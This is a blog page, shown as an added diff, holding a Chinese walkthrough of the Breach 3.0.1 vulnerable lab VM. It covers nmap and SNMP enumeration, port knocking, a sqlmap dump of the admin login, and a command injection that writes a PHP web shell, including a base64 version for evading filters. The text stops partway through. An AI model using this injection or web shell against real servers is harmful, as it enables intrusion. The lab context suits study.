@@ -1,0 +1,551 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="题目地址：https://www.vulnhub.com/entry/breach-301,177/
+下载好靶机文件之后需要先把文件后缀改为ova，把之前的“.”去掉，然后用Vmware打开此文件导入虚拟机，等待虚拟机导入完毕，将网络设置为NAT并设置DHCP服务器，使靶机能自动获取IP地址，然后开启虚拟机。
+虚拟机打开之后会显示自动配置网络设置，靶机系统是Ubuntu14.04，靶机成功启动之后">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>Breach3.0靶机渗透记录 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Breach3.0靶机渗透记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-09-21 15:46" pubdate>
+        2018年9月21日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      37
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Breach3.0靶机渗透记录</h1>
+            
+            <div class="markdown-body">
+              <p>题目地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/breach-301,177/">https://www.vulnhub.com/entry/breach-301,177/</a></p>
+<p>下载好靶机文件之后需要先把文件后缀改为ova，把之前的“.”去掉，然后用Vmware打开此文件导入虚拟机，等待虚拟机导入完毕，将网络设置为NAT并设置DHCP服务器，使靶机能自动获取IP地址，然后开启虚拟机。</p>
+<p>虚拟机打开之后会显示自动配置网络设置，靶机系统是Ubuntu14.04，靶机成功启动之后查看虚拟机网卡的网段，然后使用nmap进行这一网段的ping扫描来确定存活主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sn 192.168.229.0/24<br></code></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>扫描结果显示有两台存活主机，一台是我的kali虚拟机（192.168.229.128），另一台应该就是靶机了，靶机的IP地址为<code>192.168.229.128</code></p>
+<p>下一步是继续对靶机进行信息收集，还是用nmap扫一下开放的端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.229.129<br></code></pre></td></tr></table></figure>
+
+<p>结果显示一个TCP端口都没有，奇了怪了，没入口怎么破，于是又扫了一下UDP端口的开放情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  nmap -sS -sU -T4 -A -v 192.168.229.129<br>Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-19 09:21 EDT<br>NSE: Loaded 148 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 09:21<br>Completed NSE at 09:21, 0.00s elapsed<br>Initiating NSE at 09:21<br>Completed NSE at 09:21, 0.00s elapsed<br>Initiating ARP Ping Scan at 09:21<br>Scanning 192.168.229.129 [1 port]<br>Completed ARP Ping Scan at 09:21, 0.03s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 09:21<br>Completed Parallel DNS resolution of 1 host. at 09:21, 0.01s elapsed<br>Initiating SYN Stealth Scan at 09:21<br>Scanning 192.168.229.129 [1000 ports]<br>Completed SYN Stealth Scan at 09:21, 21.53s elapsed (1000 total ports)<br>Initiating UDP Scan at 09:21<br>Scanning 192.168.229.129 [1000 ports]<br>Discovered open port 161/udp on 192.168.229.129<br>Completed UDP Scan at 09:22, 10.01s elapsed (1000 total ports)<br>Initiating Service scan at 09:22<br>Scanning 1000 services on 192.168.229.129<br>Service scan Timing: About 0.40% <span class="hljs-keyword">done</span><br>Service scan Timing: About 3.20% <span class="hljs-keyword">done</span>; ETC: 11:03 (1:38:19 remaining)<br>Service scan Timing: About 6.20% <span class="hljs-keyword">done</span>; ETC: 10:40 (1:13:53 remaining)<br>Service scan Timing: About 9.20% <span class="hljs-keyword">done</span>; ETC: 10:32 (1:04:09 remaining)<br>Service scan Timing: About 12.20% <span class="hljs-keyword">done</span>; ETC: 10:28 (0:58:32 remaining)<br>Service scan Timing: About 15.20% <span class="hljs-keyword">done</span>; ETC: 10:26 (0:54:29 remaining)<br>Service scan Timing: About 18.20% <span class="hljs-keyword">done</span>; ETC: 10:24 (0:51:10 remaining)<br>Service scan Timing: About 23.50% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:42:39 remaining)<br>Service scan Timing: About 24.20% <span class="hljs-keyword">done</span>; ETC: 10:22 (0:45:50 remaining)<br>Service scan Timing: About 29.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:39:16 remaining)<br>Service scan Timing: About 35.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:35:46 remaining)<br>Service scan Timing: About 41.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:32:21 remaining)<br>Service scan Timing: About 47.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:28:59 remaining)<br>Service scan Timing: About 53.40% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:25:38 remaining)<br>Service scan Timing: About 59.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:22:18 remaining)<br>Service scan Timing: About 65.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:18:59 remaining)<br>Service scan Timing: About 71.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:15:41 remaining)<br>Service scan Timing: About 77.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:12:23 remaining)<br>Service scan Timing: About 83.40% <span class="hljs-keyword">done</span>; ETC: 10:16 (0:09:05 remaining)<br>Service scan Timing: About 88.90% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:06:06 remaining)<br>Service scan Timing: About 94.90% <span class="hljs-keyword">done</span>; ETC: 10:17 (0:02:48 remaining)<br>Completed Service scan at 10:17, 3319.00s elapsed (1000 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.229.129</span><br>Retrying OS detection (try <span class="hljs-comment">#2) against 192.168.229.129</span><br>NSE: Script scanning 192.168.229.129.<br>Initiating NSE at 10:17<br>Completed NSE at 10:18, 45.22s elapsed<br>Initiating NSE at 10:18<br>Completed NSE at 10:19, 55.12s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.229.129<br>Host is up (0.0042s latency).<br>Not shown: 1000 filtered ports, 999 open|filtered ports<br>PORT    STATE SERVICE VERSION<br>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)<br>| snmp-info: <br>|   enterprise: net-snmp<br>|   engineIDFormat: unknown<br>|   engineIDData: ad610f2abb4d5b5800000000<br>|   snmpEngineBoots: 19<br>|_  snmpEngineTime: 1h08m06s<br>| snmp-sysdescr: Linux Initech-DMZ01 4.4.0-45-generic <span class="hljs-comment">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64</span><br>|_  System <span class="hljs-built_in">uptime</span>: 1h08m7.02s (408702 timeticks)<br>MAC Address: 00:0C:29:76:41:E4 (VMware)<br>Too many fingerprints match this host to give specific OS details<br>Network Distance: 1 hop<br>Service Info: Host: Initech-DMZ01<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   4.20 ms 192.168.229.129<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 10:19<br>Completed NSE at 10:19, 0.00s elapsed<br>Initiating NSE at 10:19<br>Completed NSE at 10:19, 0.00s elapsed<br>Read data files from: /usr/bin/../share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3455.13 seconds<br>           Raw packets sent: 4049 (152.554KB) | Rcvd: 3 (308B)<br></code></pre></td></tr></table></figure>
+
+<p>发现只有161端口是开着的，运行了SNMP服务，做到这里想到获取此端口上暴漏的信息，于是百度有关snmp的命令，结果没什么收获，只是知道有GET方法，于是在kali中输入snmp+tab</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  snmp<br>snmp-bridge-mib  snmp-check       snmpget          snmpset          snmptrap       <br>snmpbulkget      snmpconf         snmpgetnext      snmpstatus       snmpusm        <br>snmpbulkwalk     snmpd            snmpinform       snmptable        snmpvacm       <br>snmpc            snmpdelta        snmpkey          snmptest         snmpwalk       <br>snmpcheck        snmpdf           snmpnetstat      snmptranslate<br></code></pre></td></tr></table></figure>
+
+<p>发现了与GET命令相关的命令<code>snmpget</code>于是尝试一波,发现如下信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  snmpget 192.168.229.129      <br>snmp-check v1.9 - SNMP enumerator<br>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)<br><br>[+] Try to connect to 192.168.229.129:161 using SNMPv1 and community <span class="hljs-string">&#x27;public&#x27;</span><br><br>[*] System information:<br><br>  Host IP address               : 192.168.229.129<br>  Hostname                      : Initech-DMZ01<br>  Description                   : Linux Initech-DMZ01 4.4.0-45-generic <span class="hljs-comment">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64</span><br>  Contact                       : Email: Milton@breach.local - (545)-232-1876<br>  Location                      : Initech - is this thing on? I doubt anyone thinks to look here, anyways, I<span class="hljs-string">&#x27;ve left myself a way back in and burn the place down once again.</span><br><span class="hljs-string">  Uptime snmp                   : 15:12:39.80</span><br><span class="hljs-string">  Uptime system                 : 15:12:23.84</span><br><span class="hljs-string">  System date                   : 2018-9-20 00:21:49.0</span><br></code></pre></td></tr></table></figure>
+
+<p>“这东西是开着的吗？我怀疑任何人都会想看看这里，不管怎样，我给自己留了一条路，再一次烧毁了这个地方。”，这里说出题人在这里留了后门，他离开的时候就会把后门给烧毁（破坏），其实这是个坑，因为只靠这一个端口很难继续进行下去，而且出题者说了留下了后门，那这里一定是有可以打开部分TCP端口的方法的，于是我找到了端口敲门服务<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsjhk/p/5508051.html">https://www.cnblogs.com/wsjhk/p/5508051.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install knockd<br></code></pre></td></tr></table></figure>
+
+<p>而上文中跟敲门序列最相近的就是email后面的数字了，因此：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock 192.168.229.129 545 232 1876<br></code></pre></td></tr></table></figure>
+
+<p>命令执行无任何回显,此时在扫一下TCP端口发现多了很多</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Scanning 192.168.229.129 [1000 ports]<br>Discovered open port 23/tcp on 192.168.229.129<br>Discovered open port 22/tcp on 192.168.229.129<br>Discovered open port 10010/tcp on 192.168.229.129<br>Discovered open port 5800/tcp on 192.168.229.129<br>Discovered open port 2048/tcp on 192.168.229.129<br>Discovered open port 10009/tcp on 192.168.229.129<br></code></pre></td></tr></table></figure>
+
+<p>看到telnet，先连一下试试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  telnet 192.168.229.129      <br>Trying 192.168.229.129...<br>Connected to 192.168.229.129.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>I used to have a backdoor here but they closed it down around when they moved my desk into the basement.<br>Connection closed by foreign host.<br></code></pre></td></tr></table></figure>
+
+<p>“以前这里有后门，但当他们把我的桌子搬到地下室时，他们把它关上了。”<br>没什么思路，继续练一下ssh试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ~  ssh root@192.168.229.129<br>**********************************************************************<br>*                                                                    * <br>*          The Bobs Cloud Hosting, LLC. Secure Backdoor              *<br>*                                                                    * <br>*                                                                    *<br>*  If you wish to discuss cloud hosting options, give us a call at   *<br>*                                                                    *<br>*   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   *<br>*                                                                    * <br>**********************************************************************<br><br>root@192.168.229.129<span class="hljs-string">&#x27;s password:</span><br></code></pre></td></tr></table></figure>
+
+<p>不知道密码，在这里卡了一段时间，最后突然发现这个knock序列跟刚才不一样，重新敲下门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock 192.168.229.129 555 423 1800<br></code></pre></td></tr></table></figure>
+
+<p>重新看一下开放的端口发现多了个8的TCP端口，服务是apache-httpd于是尝试从浏览器访问，发现此网站需要身份认证，账户密码在同系列挑战中的前两个挑战中留下了账号密码的信息：<strong>milton|thelaststraw</strong>，用此账户名密码登陆后看到如下界面：</p>
+<p><img src="https://i.loli.net/2018/09/21/5ba447919903c.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现一个待办事项表，而且这个上面提到了“掠夺他们所有的数据库”，点击下方的链接就来到了一个貌似是网站后台的登陆界面：</p>
+<p><img src="https://i.loli.net/2018/09/21/5ba451dba7bab.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合前面的提示，这明显是一个注入页面，于是Sqlmap启动，这是一个POST注入，我截获的部分Http头内容如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.229.129:8/breach3/index.php<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>47<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=nigh3kqnonu8co9frhn9fa6rh6<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic bWlsdG9uOnRoZWxhc3RzdHJhdw==<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br>username=test&amp;password=asdasdasd&amp;submit=+Login+<br></code></pre></td></tr></table></figure>
+
+<p>所以命令为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.229.129:8/breach3/index.php&quot;</span> --dbms=mysql --auth-type=basic --auth-cred=milton:thelaststraw --level=3 --risk=3 --data=<span class="hljs-string">&quot;username=me&amp;password=me&amp;submit=+Login+&quot;</span> -p password  -D thebobs --dump<br></code></pre></td></tr></table></figure>
+
+<p>得到的结果是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Database: thebobs<br>Table: login<br>[1 entry]<br>+----+----------+------------------------------------------+<br>| <span class="hljs-built_in">id</span> | username | password                                 |<br>+----+----------+------------------------------------------+<br>| 1  | admin    | 8f4fadb24304d60d9dcb1589aa6a5c2d2d373229 |<br>+----+----------+------------------------------------------+<br></code></pre></td></tr></table></figure>
+
+<p>利用此账号密码进行登陆</p>
+<p>进入管理界面，并发现了更多的页面：</p>
+<p><img src="https://i.loli.net/2018/09/21/5ba4678cbd09e.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://192.168.229.129:8/breach3/initechnetmonitor.php</code>页面的内容：</p>
+<p><img src="https://i.loli.net/2018/09/21/5ba467d7c93b6.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里显示了这台主机的网络信息，这里可以看到<code>ICMP</code>服务是关闭的，也就是直接去<code>ping</code>这台服务器是<code>ping</code>不同的，这里我就很好奇既然<code>ping</code>不通那么我第一步做主机<code>ping</code>扫描的时候<code>nmap</code>是怎么识别出这台主机的？</p>
+<p>既然游客这么多的页面，而且貌似没有更深的目录了，因此<code>AppScan</code>启动，扫描结果为该网站存在命令执行漏洞，此处试了一下把一句话<code>echo</code>到<code>txt</code>中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo &#x27;&lt;?php echo shell_exec($_GET[&#x27;e&#x27;]); ?&gt;&#x27; &gt;test.txt<br></code></pre></td></tr></table></figure>
+
+<p>此时发现test.txt中已经将一句话写入成功了</p>
+<p><img src="https://i.loli.net/2018/09/21/5ba4e6b842cd6.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来怎么办呢，当然是写小马了，于是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo &#x27;&lt;?php echo shell_exec($_GET[&#x27;e&#x27;]); ?&gt;&#x27; &gt;shell.php<br></code></pre></td></tr></table></figure>
+
+<p>此时试试我们的小马能不能用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/shell.php?e=ls<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2018/09/21/5ba4e76494ede.png" srcset="/img/loading.gif" lazyload></p>
+<p>执行成功，完美，其实这里有个小技巧，因为直接以铭文的方式写shell的话如果有waf或者某些过滤语句可能会把语句中的部分符号或者命令给过滤掉，因此可以采用先baseEncode后baseDecode的方式写shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php echo shell_exec($_GET[&#x27;</span>e<span class="hljs-string">&#x27;]); ?&gt;&#x27;</span> | base64<br>PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUW2VdKTsgPz4K<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUW2VdKTsgPz4K | base64 -d &gt; shell.php<br></code></pre></td></tr></table></figure>
+
+<p>这种方式可以保证写的东西不被过滤掉。</p>
+<p>做到这里就可以试试查看一下各种文件了，但是文件很多，一般来说出题人都会把重要的文件放在home、tmp等文件夹中，查看一下：</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/09/shellshock-writeup-pwnabble-kr-shell%E7%9A%84%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">shellshock-writeup-pwnabble.kr-shell的漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/09/%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BAShadowSocks/">
+                        <span class="hidden-mobile">一键搭建ShadowSocks</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
